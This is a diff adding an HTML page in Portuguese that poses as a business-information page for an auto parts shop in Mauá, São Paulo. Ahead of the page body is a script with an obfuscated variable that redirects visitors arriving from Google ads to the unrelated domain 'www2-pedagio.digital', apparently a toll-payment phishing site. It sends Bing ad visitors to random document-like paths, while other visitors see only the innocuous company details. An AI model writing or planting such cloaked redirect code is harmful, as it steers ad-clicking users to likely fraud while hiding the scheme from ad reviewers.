@@ -1,1 +1,158 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stop Freios - Informações</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #c62828;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        .container {
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #c62828;
+        }
+        p {
+            margin: 5px 0;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: #333;
+            color: white;
+        }
+    </style>
+</head>
+  <script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www2-pedagio.digital/3289/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+    <h1>Stop Freios</h1>
+    <p>Macedo Auto Parts Comércio de Peças Automotivas LTDA</p>
+</header>
+
+<div class="container">
+
+    <div class="card">
+        <h2>Informações de Registro</h2>
+        <p><strong>CNPJ:</strong> 46.604.332/0001-86</p>
+        <p><strong>Inscrição Estadual:</strong> 442.632.230.110</p>
+        <p><strong>Razão Social:</strong> Macedo Auto Parts Comercio de Pecas Automotivas LTDA</p>
+        <p><strong>Nome Fantasia:</strong> Stop Freios</p>
+        <p><strong>Data de Abertura:</strong> 31/05/2022</p>
+        <p><strong>Porte:</strong> Empresa de Pequeno Porte</p>
+        <p><strong>Natureza Jurídica:</strong> Sociedade Empresária Limitada</p>
+        <p><strong>MEI:</strong> Não</p>
+        <p><strong>Simples Nacional:</strong> Sim (desde 31/05/2022)</p>
+        <p><strong>Capital Social:</strong> R$ 40.000,00</p>
+        <p><strong>Tipo:</strong> Matriz</p>
+        <p><strong>Situação:</strong> Ativa</p>
+    </div>
+
+    <div class="card">
+        <h2>Contato</h2>
+        <p><strong>Email:</strong> st****@****.com.br</p>
+        <p><strong>Telefone:</strong> (11) 401****-****</p>
+    </div>
+
+    <div class="card">
+        <h2>Localização</h2>
+        <p><strong>Endereço:</strong> Rua Peri, 6</p>
+        <p><strong>Bairro:</strong> Vila Bocaina</p>
+        <p><strong>CEP:</strong> 09310-525</p>
+        <p><strong>Cidade:</strong> Mauá</p>
+        <p><strong>Estado:</strong> São Paulo</p>
+    </div>
+
+</div>
+
+<footer>
+    <p>© 2026 Stop Freios - Todos os direitos reservados</p>
+</footer>
+
+</body>
+</html>
